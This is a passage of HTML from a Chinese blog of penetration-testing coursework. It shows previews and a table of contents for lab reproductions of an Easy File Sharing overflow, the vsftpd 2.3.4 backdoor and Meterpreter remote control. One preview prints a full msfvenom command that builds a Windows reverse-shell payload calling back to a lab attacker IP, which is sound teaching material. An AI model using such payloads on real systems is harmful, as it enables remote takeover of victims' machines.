实验环境   角色 系统 说明    攻击机 Kali Linux 运行 msfvenom、MSF   靶机 Windows 10 x64 虚拟机 运行生成的 payload.exe，部署 Web 服务   在线平台 微步云沙箱 https://s.threatbook.com/    1. Msfvenom 生成被控端msfvenom 用于生成指定载荷和格式的被控端程序。在 Kali 执行： 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.129 LPORT=5000 -f exe -o payload.exe  参数说明：    参数 含义    -p 指定 payload，本例为 Windows 反向控制程序   LHOST 攻击机 IP（靶机回连地址）   LPORT 回连端口，本例 5000 ...</div></div></div></a><a class="pagination-related" href="/2026/10/30/%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="网络渗透课程作业：vsftpd 笑脸后门（CVE-2011-2523）复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">网络渗透课程作业：vsftpd 笑脸后门（CVE-2011-2523）复现</div></div><div class="info-2"><div class="info-item-1">笑脸漏洞（CVE-2011-2523）手工复现：nmap 验证与获取 root shell 摘要：vsftpd 2.3.4 在 2011 年被植入后门——FTP 用户名里只要带上 :) 两个字符，服务端就会以 root 权限 fork 出一个监听 6200 端口的 shell，因此被称为”笑脸漏洞”。本文不写任何利用脚本，全程手工操作：先弄懂后门的工作原理，再用 nmap 验证靶机是否存在该漏洞，然后用 ftp&#x2F;nc 手动触发后门、连上 6200 端口拿到 root shell；接着把这套验证流程写成 Python 检测 PoC（smiley_poc.py）；最后回到 vsftpd 被篡改的源码，看这个漏洞到底是怎么来的。   一、漏洞概述   项目 内容    漏洞名称 vsftpd 2.3.4 笑脸后门（Smiley Face &#x2F; vsftpd 2.3.4 Backdoor）   编号 CVE-2011-2523   披露时间 2011 年 7 月   受影响版本 vsftpd 2.3.4（官方源码包被替换，仅该版本）   漏洞类型 后门植入 &#x2F;...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/10/30/%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="网络渗透课程作业：vsftpd 笑脸后门（CVE-2011-2523）复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-30</div><div class="info-item-2">网络渗透课程作业：vsftpd 笑脸后门（CVE-2011-2523）复现</div></div><div class="info-2"><div class="info-item-1">笑脸漏洞（CVE-2011-2523）手工复现：nmap 验证与获取 root shell 摘要：vsftpd 2.3.4 在 2011 年被植入后门——FTP 用户名里只要带上 :) 两个字符，服务端就会以 root 权限 fork 出一个监听 6200 端口的 shell，因此被称为”笑脸漏洞”。本文不写任何利用脚本，全程手工操作：先弄懂后门的工作原理，再用 nmap 验证靶机是否存在该漏洞，然后用 ftp&#x2F;nc 手动触发后门、连上 6200 端口拿到 root shell；接着把这套验证流程写成 Python 检测 PoC（smiley_poc.py）；最后回到 vsftpd 被篡改的源码，看这个漏洞到底是怎么来的。   一、漏洞概述   项目 内容    漏洞名称 vsftpd 2.3.4 笑脸后门（Smiley Face &#x2F; vsftpd 2.3.4 Backdoor）   编号 CVE-2011-2523   披露时间 2011 年 7 月   受影响版本 vsftpd 2.3.4（官方源码包被替换，仅该版本）   漏洞类型 后门植入 &#x2F;...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Qu0rtz-blip</div><div class="author-info-description">记录 CTF 与漏洞复现</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Easy-File-Sharing-Web-Server-%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">Easy File Sharing Web Server 远程溢出漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">0. 实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9ANmap-%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87"><span class="toc-number">1.2.</span> <span class="toc-text">1. 信息收集：Nmap 扫描目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE%EF%BC%9Asearchsploit"><span class="toc-number">1.3.</span> <span class="toc-text">2.1 漏洞查找：searchsploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-searchsploit-%E4%B8%AD%E5%A4%9A%E4%B8%AA-exploit-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.2 searchsploit 中多个 exploit 的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9APython-%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">3. 攻击方式一：Python 脚本利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%9F%A5%E7%9C%8B%E8%84%9A%E6%9C%AC%E5%8F%82%E6%95%B0"><span class="toc-number">1.4.1.</span> <span class="toc-text">3.1 查看脚本参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"><span class="toc-number">1.4.2.</span> <span class="toc-text">3.2 执行攻击脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9AMetasploit-%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">4. 攻击方式二：Metasploit 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%90%AF%E5%8A%A8-MSF-%E5%B9%B6%E6%9F%A5%E6%89%BE%E6%A8%A1%E5%9D%97"><span class="toc-number">1.5.1.</span> <span class="toc-text">4.1 启动 MSF 并查找模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97"><span class="toc-number">1.5.2.</span> <span class="toc-text">4.2 加载模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E6%9F%A5%E7%9C%8B%E9%9C%80%E8%A6%81%E9%85%8D%E7%BD%AE%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">1.5.3.</span> <span class="toc-text">4.3 查看需要配置的参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E8%AE%BE%E7%BD%AE%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.5.4.</span> <span class="toc-text">4.4 设置攻击载荷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E5%A1%AB%E5%86%99%E5%8F%82%E6%95%B0"><span class="toc-number">1.5.5.</span> <span class="toc-text">4.5 填写参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E7%A1%AE%E8%AE%A4%E5%8F%82%E6%95%B0%E5%90%8E%E6%89%A7%E8%A1%8C"><span class="toc-number">1.5.6.</span> <span class="toc-text">4.6 确认参数后执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7-%E9%AA%8C%E8%AF%81%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90"><span class="toc-number">1.5.7.</span> <span class="toc-text">4.7 验证控制权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.</span> <span class="toc-text">5. 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.7.</span> <span class="toc-text">6. 修复建议</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/09/hello-world/" title="Hello World">Hello World</a><time datetime="2026-11-09T04:43:28.783Z" title="发表于 2026-11-09 12:43:28">2026-11-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/09/ZoomEye%E4%B8%8E%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86-%E4%BD%9C%E4%B8%9A%E5%8D%9A%E5%AE%A2/" title="网络渗透课程作业：ZoomEye 网络空间测绘与子域名收集">网络渗透课程作业：ZoomEye 网络空间测绘与子域名收集</a><time datetime="2026-11-09T02:47:00.000Z" title="发表于 2026-11-09 10:47:00">2026-11-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/06/Meterpreter%20%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B8%8E%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%A4%8D%E7%8E%B0/" title="网络渗透课程作业：Meterpreter 远程控制与一句话木马">网络渗透课程作业：Meterpreter 远程控制与一句话木马</a><time datetime="2026-11-06T08:57:00.000Z" title="发表于 2026-11-06 16:57:00">2026-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/06/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/" title="网络渗透课程作业：Easy File Sharing 远程缓冲区溢出漏洞复现">网络渗透课程作业：Easy File Sharing 远程缓冲区溢出漏洞复现</a><time datetime="2026-11-06T08:55:00.000Z" title="发表于 2026-11-06 16:55:00">2026-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/10/30/%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="网络渗透课程作业：vsftpd 笑脸后门（CVE-2011-2523）复现">网络渗透课程作业：vsftpd 笑脸后门（CVE-2011-2523）复现</a><time datetime="2026-10-30T11:54:00.000Z" title="发表于 2026-10-30 19:54:00">2026-10-30</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Qu0rtz-blip</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.2"></script><script src="/js/main.js?v=5.7.2"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
